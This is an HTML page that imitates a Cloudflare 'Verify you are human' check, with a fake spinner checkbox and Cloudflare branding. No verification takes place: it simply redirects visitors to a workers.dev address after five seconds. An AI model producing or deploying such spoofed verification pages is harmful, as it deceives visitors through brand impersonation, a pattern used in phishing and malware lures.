<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying...</title>
<meta http-equiv="refresh" content="5;url=https://mc.clearsmp.workers.dev">
<style>
*{box-sizing:border-box}
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:#f6f7f9;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
}
.card{
  width:360px;
  background:#fff;
  border-radius:12px;
  box-shadow:0 8px 25px rgba(0,0,0,0.08);
  padding:24px;
}
.row{
  display:flex;
  align-items:center;
  gap:12px;
}
.checkbox{
  width:26px;
  height:26px;
  border:2px solid #d1d5db;
  border-radius:6px;
  position:relative;
  overflow:hidden;
}
.spinner{
  width:18px;
  height:18px;
  border:3px solid #e5e7eb;
  border-top:3px solid #f97316;
  border-radius:50%;
  position:absolute;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  animation:spin 1s linear infinite;
}
@keyframes spin{
  0%{transform:translate(-50%,-50%) rotate(0deg);}
  100%{transform:translate(-50%,-50%) rotate(360deg);}
}
.text{
  font-size:15px;
  color:#111827;
}
.footer{
  margin-top:18px;
  display:flex;
  justify-content:space-between;
  align-items:center;
  font-size:12px;
  color:#6b7280;
}
.brand{
  font-weight:600;
  letter-spacing:0.5px;
}
.links span{
  margin-left:8px;
  cursor:pointer;
}
.fade{
  animation:fadein 0.6s ease;
}
@keyframes fadein{
  from{opacity:0; transform:translateY(5px);}
  to{opacity:1; transform:translateY(0);}
}
</style>
</head>
<body>
  <div class="card fade">
    <div class="row">
      <div class="checkbox">
        <div class="spinner"></div>
      </div>
      <div class="text">Verify you are human</div>
    </div>
    <div class="footer">
      <div class="brand">Powered by Cloudflare</div>
      <div class="links">
        <span>privacy</span>
        <span>Terms</span>
      </div>
    </div>
  </div>
</body>
</html>
